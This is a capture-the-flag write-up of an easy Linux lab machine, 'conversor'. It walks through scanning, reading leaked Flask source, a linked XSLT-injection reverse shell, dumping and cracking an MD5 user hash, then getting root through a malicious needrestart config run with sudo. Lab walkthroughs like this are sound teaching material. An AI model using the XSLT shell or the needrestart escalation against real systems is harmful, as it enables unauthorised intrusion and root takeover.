## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
- Easy
- Linux
```

## RustScan 
- Scan Network
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Port 80
```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<main id="app-main">
<div class="elegant-card">
<h2>Login</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required style="margin-bottom:1rem;width:100%;padding:0.6rem;border-radius:8px;border:1px solid #ccc;">
<input type="password" name="password" placeholder="Password" required style="margin-bottom:1rem;width:100%;padding:0.6rem;border-radius:8px;border:1px solid #ccc;">
<button class="btn">Login</button>
<p style="margin-top:1rem;">Don't have an account? <a href="/register">Register</a></p>
</form>
</div>
</main>
</body>
</html>  
```

### Gobuster 
```bash
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/convert              (Status: 405) [Size: 153]
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/login                (Status: 200) [Size: 722]
/logout               (Status: 302) [Size: 199] [--> /login]
/register             (Status: 200) [Size: 726]
/server-status        (Status: 403) [Size: 278]
===============================================================
Finished
```

## UPdate
- change the packet size 
```bash
$sudo ip link set dev tun0 mtu 1200
```
## Login
- Register an account on website and Login Using it 
- after login navigate to about & got the Zip file with Source Code to infiltrate
```bash
$tar -xf source_code.tar.gz    
app.py  
app.wsgi  
install.md  
instance  
scripts   
static  
templates  
uploads
```

#### App.py
```python
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = '[secret key omitted]'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"

```
#### MD File
```md
To deploy Conversor, we can extract the compressed file:
"""
tar -xvf source_code.tar.gz
"""
We install flask:
"""
pip3 install flask
"""
We can run the app.py file:
"""
python3 app.py
"""
You can also run it with Apache using the app.wsgi file.
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

##### Got the Exploit
```Github
https://github.com/ex-cal1bur/XSLT-Injection_reverse-shell/blob/main/malicious.xslt
```
- Got the Reverse-shell
```bash
www-data@conversor:~/conversor.htb/instance$ whoami
www-data
www-data@conversor:~/conversor.htb/instance$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@conversor:~/conversor.htb/instance$ 
```
## Databases
```bash
www-data@conversor:~$ find / -type f \( -iname "*.db" -o -iname "*.sqlite" \) 2>/dev/null
/usr/lib/firmware/regulatory.db
/var/www/conversor.htb/instance/users.db
/var/lib/command-not-found/commands.db
/var/lib/fwupd/pending.db
/var/lib/PackageKit/transactions.db
```
- /var/www/conversor.htb/instance/users.db `useful`
## SQLite
```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 /var/www/conversor.htb/instance/users.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * FROM users;
1|fismathack|[hash omitted]
5|test123|[hash omitted]
sqlite> 
```

## Hash
- Hash cracked through `crackstation`
- Hash `[hash omitted]` & cracked `[password omitted]` 
```creds
1|fismathack|[password omitted]
```
## SSH
```bash
$ ssh fismathack@conversor.htb
fismathack@conversor.htb''s password:[password omitted]
fismathack@conversor:~$ ls
user.txt
fismathack@conversor:~$ cat user.txt
[flag omitted]
```

## User Flag
```bash
[flag omitted]
```

## Escaltion
```bash
$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
fismathack@conversor:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/chsh
/usr/libexec/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

## Path
`/usr/sbin/needrestart`
```bash
fismathack@conversor:~$/usr/sbin/needrestart --help
needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```

- More Information
```bash
fismathack@conversor:~$ sudo /usr/sbin/needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7
[main] running in root mode
[Core] Using UI 'NeedRestart::UI::stdio'...
[main] systemd detected
[main] vm detected
[Core] #830 is a NeedRestart::Interp::Python
[Python] #830: source=/usr/bin/networkd-dispatcher
[main] inside container or vm, skipping microcode checks
[Kernel] Linux: kernel release 5.15.0-160-generic, kernel version #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025
Failed to load NeedRestart::Kernel::kFreeBSD: [Kernel/kFreeBSD] Not running on GNU/kFreeBSD!
[Kernel/Linux] /boot/vmlinuz.old => 5.15.0-151-generic (buildd@lcy02-amd64-092) #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 [5.15.0-151-generic]
[Kernel/Linux] /boot/vmlinuz-5.15.0-160-generic => 5.15.0-160-generic (buildd@lcy02-amd64-086) #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025 [5.15.0-160-generic]*
[Kernel/Linux] /boot/vmlinuz-5.15.0-151-generic => 5.15.0-151-generic (buildd@lcy02-amd64-092) #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 [5.15.0-151-generic]
[Kernel/Linux] /boot/vmlinuz => 5.15.0-160-generic (buildd@lcy02-amd64-086) #170-Ubuntu SMP Wed Oct 1 10:06:56 UTC 2025 [5.15.0-160-generic]*
[Kernel/Linux] Expected linux version: 5.15.0-160-generic

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```
- Lets create an Conf. File as it take Files upgrade or run as root
```bash
$ ls
user.txt
fismathack@conversor:~$ nano exploit.conf
fismathack@conversor:~$ cat exploit.conf
 BEGIN { system("/bin/bash -p") }
%nrconf = (
    verbosity => 0,
    restart => 'a'
);
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /home/fismathack/exploit.conf
root@conversor:/home/fismathack#
```
- Got the Root
## Root
```bash
root@conversor:/home/fismathack# cd
root@conversor:~# ls
root.txt  scripts
root@conversor:~# cat root.txt
[flag omitted]
```
- Root Flag
```flag
[flag omitted]
```
# END
